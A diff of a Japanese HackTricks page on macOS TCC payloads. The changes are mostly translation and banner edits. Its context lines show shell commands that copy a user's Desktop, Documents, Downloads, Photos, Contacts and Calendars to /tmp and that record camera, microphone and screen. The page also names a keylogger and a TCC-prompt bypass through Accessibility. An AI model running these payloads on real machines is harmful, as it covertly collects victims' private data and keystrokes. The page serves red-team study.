@@ -1,27 +1,28 @@
-# macOS TCC ペイロード
+# macOS TCC Payloads
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricks をサポートする他の方法:
-
-- **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェック！
-- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
-- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegramグループ](https://t.me/peass) に参加するか、**Twitter** 🐦 で **@carlospolopm** をフォローする [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-- **HackTricks** と **HackTricks Cloud** の github リポジトリに PR を提出して、あなたのハッキングテクニックを共有する。
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ### デスクトップ
 
-- **権限**: なし
-- **TCC**: kTCCServiceSystemPolicyDesktopFolder
+* **権限**: なし
+* **TCC**: kTCCServiceSystemPolicyDesktopFolder
 
 {% tabs %}
 {% tab title="ObjetiveC" %}
-`$HOME/Desktop` を `/tmp/desktop` にコピーします。
+`$HOME/Desktop`を`/tmp/desktop`にコピーします。
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -56,8 +57,7 @@ fclose(stderr); // Close the file stream
 {% endtab %}
 
 {% tab title="シェル" %}
-`$HOME/Desktop`を`/tmp/desktop`にコピーします。
-{% endtab %}
+`$HOME/Desktop` を `/tmp/desktop` にコピーします。
 ```bash
 cp -r "$HOME/Desktop" "/tmp/desktop"
 ```
@@ -71,7 +71,7 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 
 {% tabs %}
 {% tab title="ObjetiveC" %}
-`$HOME/Documents`を`/tmp/documents`にコピーします。
+`$HOME/Documents` を `/tmp/documents` にコピーします。
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -105,9 +105,8 @@ fclose(stderr); // Close the file stream
 ```
 {% endtab %}
 
-{% tab title="シェル" %}
+{% tab title="Shell" %}
 `$HOME/`Documentsを`/tmp/documents`にコピーします。
-{% endtab %}
 ```bash
 cp -r "$HOME/Documents" "/tmp/documents"
 ```
@@ -121,7 +120,7 @@ cp -r "$HOME/Documents" "/tmp/documents"
 
 {% tabs %}
 {% tab title="ObjetiveC" %}
-`$HOME/Downloads`を`/tmp/downloads`にコピーします。
+`$HOME/Downloads` を `/tmp/downloads` にコピーします。
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -156,8 +155,7 @@ fclose(stderr); // Close the file stream
 {% endtab %}
 
 {% tab title="シェル" %}
-`$HOME/Dowloads`を`/tmp/downloads`にコピーします。
-{% endtab %}
+`$HOME/Dowloads` を `/tmp/downloads` にコピーします。
 ```bash
 cp -r "$HOME/Downloads" "/tmp/downloads"
 ```
@@ -171,7 +169,7 @@ cp -r "$HOME/Downloads" "/tmp/downloads"
 
 {% tabs %}
 {% tab title="ObjetiveC" %}
-`$HOME/Pictures/Photos Library.photoslibrary`を`/tmp/photos`にコピーします。
+`$HOME/Pictures/Photos Library.photoslibrary` を `/tmp/photos` にコピーします。
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -207,7 +205,6 @@ fclose(stderr); // Close the file stream
 
 {% tab title="シェル" %}
 `$HOME/Pictures/Photos Library.photoslibrary` を `/tmp/photos` にコピーします。
-{% endtab %}
 ```bash
 cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 ```
@@ -221,7 +218,7 @@ cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 
 {% tabs %}
 {% tab title="ObjetiveC" %}
-`$HOME/Library/Application Support/AddressBook`を`/tmp/contacts`にコピーします。
+`$HOME/Library/Application Support/AddressBook` を `/tmp/contacts` にコピーします。
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -256,8 +253,7 @@ fclose(stderr); // Close the file stream
 {% endtab %}
 
 {% tab title="シェル" %}
-`$HOME/Library/Application Support/AddressBook`を`/tmp/contacts`にコピーします。
-{% endtab %}
+`$HOME/Library/Application Support/AddressBook` を `/tmp/contacts` にコピーします。
 ```bash
 cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 ```
@@ -305,9 +301,8 @@ fclose(stderr); // Close the file stream
 ```
 {% endtab %}
 
-{% tab title="シェル" %}
-`$HOME/Library/Calendars`を`/tmp/calendars`にコピーします。
-{% endtab %}
+{% tab title="Shell" %}
+`$HOME/Library/Calendars` を `/tmp/calendars` にコピーします。
 ```bash
 cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 ```
@@ -320,7 +315,7 @@ cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 * **TCC**: `kTCCServiceCamera`
 
 {% tabs %}
-{% tab title="ObjectiveC - Record" %}
+{% tab title="ObjetiveC - 録画" %}
 3秒のビデオを録画し、**`/tmp/recording.mov`**に保存します。
 ```objectivec
 #import <Foundation/Foundation.h>
@@ -400,8 +395,7 @@ fclose(stderr); // Close the file stream
 {% endtab %}
 
 {% tab title="ObjectiveC - チェック" %}
-プログラムがカメラへのアクセス権を持っているかどうかを確認します。
-{% endtab %}
+プログラムがカメラにアクセスできるか確認します。
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -433,13 +427,13 @@ fclose(stderr); // Close the file stream
 ```
 {% endtab %}
 
-{% tab title="シェル" %}
+{% tab title="Shell" %}
 カメラで写真を撮る
-{% endtab %}
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
 {% endtab %}
+{% endtabs %}
 
 ### マイク
 
@@ -447,8 +441,8 @@ ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 * **TCC**: `kTCCServiceMicrophone`
 
 {% tabs %}
-{% tab title="ObjectiveC - Record" %}
-5秒のオーディオを録音し、`/tmp/recording.m4a`に保存します。
+{% tab title="ObjetiveC - 録音" %}
+5秒間の音声を録音し、`/tmp/recording.m4a`に保存します。
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -548,8 +542,7 @@ fclose(stderr); // Close the file stream
 {% endtab %}
 
 {% tab title="ObjectiveC - チェック" %}
-アプリがマイクにアクセスできるかどうかをチェックします。
-{% endtab %}
+アプリがマイクにアクセスできるか確認します。
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -579,9 +572,8 @@ static void telegram(int argc, const char **argv) {
 ```
 {% endtab %}
 
-{% tab title="シェル" %}
-5秒間のオーディオを録音し、`/tmp/recording.wav`に保存します。
-{% endtab %}
+{% tab title="Shell" %}
+5秒の音声を録音し、`/tmp/recording.wav`に保存します。
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -591,18 +583,18 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 {% endtab %}
 {% endtabs %}
 
-### ロケーション
+### 位置
 
 {% hint style="success" %}
-アプリがロケーションを取得するためには、**プライバシーとセキュリティ**から**位置情報サービス**を有効にする必要があります。有効にしないとアクセスできません。
+アプリが位置情報を取得するには、**位置情報サービス**（プライバシーとセキュリティから）**を有効にする必要があります。** そうでないと、アクセスできません。
 {% endhint %}
 
 * **権限**: `com.apple.security.personal-information.location`
-* **TCC**: `/var/db/locationd/clients.plist` で許可される
+* **TCC**: `/var/db/locationd/clients.plist` で付与されます
 
 {% tabs %}
 {% tab title="ObjectiveC" %}
-`/tmp/logs.txt` にロケーションを書き込む
+`/tmp/logs.txt` に位置情報を書き込む
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -652,7 +644,7 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {% endtab %}
 
 {% tab title="シェル" %}
-場所へのアクセスを取得します
+位置情報にアクセスする
 {% endtab %}
 ```
 ???
@@ -667,7 +659,7 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
 {% tabs %}
 {% tab title="ObjectiveC" %}
-メインスクリーンを5秒間`/tmp/screen.mov`に録画します。
+メインスクリーンを5秒間`/tmp/screen.mov`に録画する
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -723,9 +715,8 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 ```
 {% endtab %}
 
-{% tab title="シェル" %}
-メイン画面を5秒間記録します
-{% endtab %}
+{% tab title="Shell" %}
+メインスクリーンを5秒間録画する
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
@@ -737,7 +728,10 @@ screencapture -V 5 /tmp/screen.mov
 * **権限**: なし
 * **TCC**: `kTCCServiceAccessibility`
 
-TCC権限を使用して、Finderの制御を受け入れ、Enterキーを押してTCCをバイパスします。
+TCCの特権を使用して、Finderの制御を受け入れ、Enterを押してその方法でTCCをバイパスします。
+
+{% tabs %}
+{% tab title="TCCを受け入れる" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -790,8 +784,8 @@ return 0;
 ```
 {% endtab %}
 
-{% tab title="Keylogger" %}
-**`/tmp/keystrokes.txt`**に押されたキーを保存します。
+{% tab title="キーロガー" %}
+押されたキーを **`/tmp/keystrokes.txt`** に保存します
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -899,19 +893,20 @@ return 0;
 {% endtabs %}
 
 {% hint style="danger" %}
-**アクセシビリティは非常に強力な権限**です。たとえば、**キーストローク攻撃**をSystem Eventsを呼び出す必要なく、それだけで実行することができます。
+**アクセシビリティは非常に強力な権限です**。これを他の方法で悪用することができ、例えば**キーストローク攻撃**を行うことができます。System Eventsを呼び出す必要はありません。
 {% endhint %}
+
+{% hint style="success" %}
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary>HackTricksをサポートする</summary>
 
-HackTricksをサポートする他の方法：
-
-* **HackTricksで企業を宣伝したい**場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする。
-* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
+{% endhint %}
